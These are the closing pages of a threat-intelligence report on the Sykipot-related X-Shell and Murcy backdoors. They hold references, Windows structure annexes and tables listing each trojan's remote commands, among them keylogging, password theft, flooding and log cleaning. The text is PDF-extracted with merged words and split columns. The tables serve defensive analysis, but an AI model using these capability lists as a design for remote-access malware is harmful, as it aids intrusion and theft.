+SymantecCorporation.(2010,	March	11).	Backdoor.Sykipot At Work.	Retrieved	February	02,	2012,	from	Symantec
+Connect	Community:	http://www.symantec.com/connect/blogs/backdoorsykipot­work
+SymantecCorporation.(2012,	January	26).	Insight into Sykipot Operations |	Symantec Connect Community.	
+Retrieved	February	05,2012,	from	SymantecConnect	Community:	
+http://www.symantec.com/connect/blogs/insight­sykipot­operations­0
+Telus.	(2011,August	03).	Backdoor.Win32.Murcy.A	­ TELUS	Security	Labs.	Retrieved	December06,	2011,	from	
+TELUS	SecurityLabs:	http://telussecuritylabs.com/threats/show/TSL20110803­01
+Thakur,	V.	(2011,	December14).	The	Sykipot Attacks	| Symantec	Connect Community.Retrieved	February	04,2012,	
+fromSymantecConnectCommunity:	http://www.symantec.com/connect/blogs/sykipot­attacks
+Threat	Expert	Ltd.(2010,	June15).	ThreatExpert Report.	Retrieved	January	11,	2012,	fromThreatExpert:	
+http://www.threatexpert.com/report.aspx?md5=b098aee16bd138c412075C9d315aefc9
+Threat	Expert	Ltd.(2011,	July	26).	ThreatExpert Report: Backdoor.Win32.Agent.anvj, Trojan­Downloader.Delphi.	
+Retrieved	December17,	2011,	from	ThreatExpert:	
+http://www.threatexpert.com/report.aspx?md5=3e3736dffedaf2a0ae4d948567933b3f	
+Threat	Expert	Ltd.(2011,	November04). ThreatExpert report: Mal/Behav­027, Backdoor:Win32/Idicaf.gen!B.	
+Retrieved	November25,	2011,	from	ThreatExpert:	
+http://www.threatexpert.com/report.aspx?md5=229947cc71a4601b8b7794b402e536a9
+Threat	Expert	Ltd.(2011,	October06).	ThreatExpert Report: Mal/Behav­027, Virus/Win32.Atraps.CK.	Retrieved
+November21,2011,from	ThreatExpert:	
+http://www.threatexpert.com/report.aspx?md5=da2f98315f4c56fce21273e21e453b76
+Threat	Expert	Ltd.(2011,	September25).	ThreatExpert Report: TrojanDropper: Win32/Idicaf.C,
+Virus.Win32.Atraps.CK, Backdoor.Win32.Agent.bhxn.	Retrieved	December25,	2011,	fromThreatExpert:
+http://www.threatexpert.com/report.aspx?md5=f4c08d3df5ede0790e34eae0c5db8a7a
+Threat	Expert	Ltd.(2008,	December18).	ThreatExpert Report: Mal/EncPk­BL, Worm:Win32/Emerleox.J,
+Packed.Win32.Klone.af.	Retrieved	January	15,	2012,	fromThreatExpert:
+http://www.threatexpert.com/report.aspx?md5=37037f674bcbbb7eef3889ab6eb30268
+ThreatExpertLtd.	(2010,	March	18).	ThreatExpert Report: Troj/Agent­MSC, BinImage/Agent.283805.	Retrieved	
+January	26,	2012,	fromThreatExpert:	
+http://www.threatexpert.com/report.aspx?md5=2d8a9038e151fb30d45ea8668afd2a8e
+ThreatExpertLtd.	(2011,	December09).	ThreatExpert Report: Backdoor.Win32.Delf.abow, Trojan.Win32.CDur,
+Mal/Behav­058..Retrieved	February	03,	2012,	fromThreatExpert:	
+http://www.threatexpert.com/report.aspx?md5=f0b848a841d4ef3406a6f9c4766c540b
+US­CERT.	(2011,	March	26).	Early Warning and Indicator	Notice	(EWIN)­11­077­01A	UPDATE.	Retrieved	January	
+06,	2011,from	IncidentPreventionand	Detection:	Protecting	InformationSecurity	of	NationalBanks:	
+http://www.occ.treas.gov/news­issuances/alerts/2011/alert­2011­4b.pdf
+Verisign.(2011).	Verisign Authentication Services.	Retrieved	December29,2011,fromVerisignClass3	Code
+Signing	CertificateRevocationList:http://crl.verisign.com/CSC3­2009.crl
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE22OF	29
+
+Ward,E.	(2011,July	31).	Backdoor.Murcy	|	Symantec.	RetrievedJanuary05,2011,from	Symantec:
+http://www.symantec.com/security_response/writeup.jsp?docid=2011­080105­2030­99
+Wikipedia.	(n.d.).	List of Intel microprocessors.	Retrieved	January	21,	2012,from	Wikipedia,	thefreeencyclopedia:	
+http://en.wikipedia.org/wiki/List_of_Intel_microprocessors
+Wong,	J.	(2011,	August16).	Encyclopedia entry:Backdoor.Win32/Thoper.A.	RetrievedJanuary	24,	2012,	from
+Microsoft	MalwareProtectionCenter:
+http://www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?Name=Backdoor%3AWin
+32%2FThoper.A
+XTiger­Crackersoftware.(2011,	February	14).	All for	Dream...RetrievedDecember23,	2011,from	xdoors.net:	
+http://www.xdoors.net/faq/index.html
+XTiger.	(2010,April28).	forum.xdoors.net.RetrievedDecember19,2011,from	xdoors.net:
+http://forum.xdoors.net/viewtopic.php?f=4&t=7
+XTiger.	(2011,March	16). forum.xdoors.net. Topic: X­Door/X­Shell	free download paused.	Retrieved	December27,
+2011,	fromforum.xdoors.net:	http://forum.xdoors.net/viewtopic.php?f=5&t=76
+XTiger.	(2011). Xdoors.net.	Retrieved	December23,2011,	from	Allfordream...:	http://www.xdoors.net
+XTiger.	(n.d.).	X­Shell.	Retrieved	December23,2011,from	XDoors:http://www.xdoors.net/help/X­Shell.htm
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE23OF	29
+
+OFFSET
+0
+4
+8
+12
+16
+20
+148
+150
+152
+154
+155
+
+ANNEX A
+
+LENGTH	(IN	BYTES)
+4
+4
+4
+4
+4
+128
+2
+2
+2
+1
+1
+
+FORMAT	OF OSVERSIONINFOEX STRUCTURE
+
+MEMBERDESCRIPTION
+Structuresizeinbytes.‘0x9C’	(156bytes).
+OSmajorversion.
+OSminorversion.
+OSbuildnumber.
+AnidentifierfortheOSplatform.
+Anull­terminated	string	thatindicatesthelatestServicePack	installed.
+ServicePackmajorversionnumber.
+ServicePackminorversionnumber.
+Abitmask91thatidentifies	theproductsuites	installed	onthesystem.
+Producttypethatindicateswhetherthesystemisaworkstation(‘0x01’),adomaincontroller
+(‘0x02’)oranNTserverbutnotadomaincontroller(‘0x03’).
+Abytereserved	forfutureuse.
+
+																																																																			
+91ForadetaileddescriptionoftheproductsuitebitmaskrefertotheMicrosoftMSDNOSVERSIONINFOEXreferencepage.(Microsoft
+Corporation,2011)
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE24OF	29
+
+ANNEX B
+
+FORMAT	OF SYSTEM_INFO STRUCTURE
+
+LENGTH	(IN	BYTES)
+2
+2
+4
+4
+4
+4
+4
+4
+4
+2
+2
+
+MEMBERDESCRIPTION
+Anumberindicating	theprocessorarchitectureoftheinstalled	OS.
+Bytes	reservedforfutureuse.
+Pagesizeused	and	thegranularityofpageprotectionand	commitment.
+Minimumapplicationaddress.This	is	thelowestmemoryaddressthatapplicationsand	
+DLLscanaccess.
+Maximumapplicationaddress.Thisis	thehighestmemoryaddress	thatapplications	
+and	DLLscanaccess.
+Amask	representing	thesetofprocessors	configuredintothesystem.
+Thenumberoflogical	processors.
+Processortype.
+Granularityforthestarting	addressatwhich	virtual	memorycanbeallocated.
+Thearchitecture­dependentprocessorlevel.
+Thearchitecture­dependentprocessorrevision.
+
+OFFSET
+0
+2
+4
+8
+12
+16
+20
+24
+28
+32
+34
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE25OF	29
+
+COMMAND
+svc
+pslist
+pskill
+shell
+reboot
+shutdown
+filetime
+uninstall
+mlist
+idle
+uptime
+update
+urlh
+urln
+exeh
+exen
+zip
+mhost
+fputs
+fgets
+inject
+pei
+per
+avinfo
+htan
+devcon
+keylog
+cleanl
+display
+proxy
+socks5
+tcpagent
+clipboard
+tcplist
+tcpkill
+sysinfo
+spilist
+cdrom
+sens
+rebind
+
+ANNEX C
+
+SUMMARY OF	X­SHELL COMMANDS
+
+COMMANDDESCRIPTION
+Servicecontrol	(list/stop/start/view/installetc.).
+Lists	processes.
+Kills	process.
+Starts	acommand	shell.
+Restarts	thecomputer.
+Shuts	downthecomputer.
+Modifies	timestamponafile(datecreatedetc.).
+UninstallsRAT.
+Gets	process	modulespecificinformation.
+Gets	hostmouseand	keyboard	idletime.
+Gets	systemuptime.
+UpdatepluginfromURL.
+Opens	aURL	inhiddenview.
+Opens	aURL	innormalview.
+Executes	aprograminhiddenview.
+Executes	aprograminnormal	view.
+Compresses	afileorfoldertoaCabfile.
+Gets	currentControl	HostIP	address	and	port.
+Uploads	afiletotheControlHost.
+Downloads	afilefromtheControl	HostoraURL.
+Injectsapluginintoanotherprocess.(Thedefaultprocesstoinjectintois	‘IEXPLORE.EXE’.)
+Infects	aportableexecutablefile.
+Repairs	aportableexecutable	file.
+Displays	informationaboutinstalled	antivirussoftware.
+TCP	portforwarding	and	mapping.
+Devicemanager.
+Keyloggercontrol.
+Cleanseventlog.
+Displays	control	proxy.
+HTTPproxyservice.
+SOCK5proxyservice.
+TCP	portforwarding.
+Clipboard	control.
+Lists	TCPconnections.
+Terminates	aTCP	connection.
+Gets	systeminformation.
+SPIlayerinformation.
+Controls	CD­ROM(open/close).
+Extracts	sensitiveinformation.
+RebindsTCP	porttogetpassword.
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE26OF	29
+
+fport
+user
+flood
+term
+findpass
+myplug
+
+Displays	portinformationwith	processpath.
+Usercontrol	(list/add/delete/	control	etc.).Supports	cloning	andcloning	check	flood.
+Initiatesafloodattack.
+Terminal	managementsettings	(viewport/setport/start/stop).
+Attempts	tofind	currentuser’sloginpassword.
+Aninterfacetothird­partydeveloped	plugins.
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE27OF	29
+
+COMMANDCODE
+0x1003
+0x1004
+0x2000
+0x2001
+0x2002
+0x2003
+0x2004
+0x2005
+0x3000
+0x3001
+0x3003
+0x300A
+0x300B
+0x300C
+0x3200
+0x5000
+0x5002
+0x5004
+0x6000
+0x6002
+0x6003
+0x6004
+0x6005
+0x7000
+0x8000
+
+ANNEX D
+
+SUMMARY OF	MURCY COMMANDS
+
+COMMANDDESCRIPTION
+GenerateSxl	valuefromtheregistrykeygroup.
+AddSxl	descriptiontoregistrykey.
+Lockcomputer.
+Log	off.
+Reboot.
+Shutdown.
+Executefile.
+Executemsg.exe.
+Getsystemdriveinformation.
+File	search.
+File	search.
+Createdirectory.
+Createprocess.
+Deletefile(s).
+Performfileoperations.
+Obtainprocessinformation.
+Obtainprocessinformation.
+Killprocess.
+Listservices.
+Deleteservice.
+Modifyserviceconfiguration.
+Startservice.
+Stopservice.
+Input/outputgenerated	intheprocesswith	anamedpipe.
+Getenvironmentstring.
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE28OF	29
+
+COPYRIGHT	NOTICE
+
+Copyright©CommandFivePty	Ltd.	Allrightsreserved.
+
+This	document	is	providedby	thecopyrightholdersunderthelicence
+that	follows.	Byobtaining,using,	and/ordistributingthisdocumentyou
+agreethat	youhaveread,understood,	and	agreetothetermsand
+conditionsthatfollow.
+ThenamesandtrademarksofCommandFivePtyLtdmay	notbe
+used	inadvertisingorpublicity	relatingtothisdocumentorits	contents
+withoutspecific,	prior,	writtenpermission.
+No	permissionisgivenforthisdocumenttobeused	forcommercial
+purposes or as part	of	any	commercial activity	or undertaking,
+including,	but	not	limited to,	use in or relating	to advertising	or
+publicity,	and/oruseinsupportof,oraspartof,any	pre­salesorsales
+activities.
+No	permissionisgiventocreatemodifiedorderivativeworks.	You
+may	distributethis	document	initsoriginalformfornon­commercial
+purposesinaccordancewith	theothertermsand	conditionsstated	
+herein.	Copyrighttitle willatalltimesremain withthecopyright
+holders.Allreferencedtrademarksremaintheproperty	of	theirrespective
+owners.THIS DOCUMENT	IS	PROVIDED	‘AS	IS’ FOR INFORMATIONAL
+PURPOSESONLYWITHNOREPRESENTATIONSORWARRANTIES	OF
+ANY KIND,
+INCLUDING BUT	NOT	LIMITED TO	ANY WARRANTY,
+EXPRESSORIMPLIED,OFMERCHANTABILITYORFITNESSFORA
+PARTICULAR PURPOSE; WARRANTY OF	NON­INFRINGEMENT,	OR
+TITLE;	NORANYWARRANTIES	PERTAININGTO	THEACCURACYOR
+COMPLETENESSOF	CONTENT.
+ANYOPINIONS	EXPRESSED	INTHISDOCUMENTMAYCHANGE
+WITHOUTNOTICEAND	ARENOTNECESSARILYTHECONSIDERED
+OPINIONS	OF	COMMAND	FIVE	PTYLTD,ITSPARTNERS,	EMPLOYEES,
+OR AFFILIATE	ORGANISATIONS.	ANY ADVICE OFFERED	IN THIS
+DOCUMENT	ISOFFERED	WITHOUTWARRANTYOFANYKIND.
+
+CommandFivePty	Ltd
+ABN:	49	149	576	670
+http://www.commandfive.com
+info@commandfive.com
+PAGE29OF	29
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+
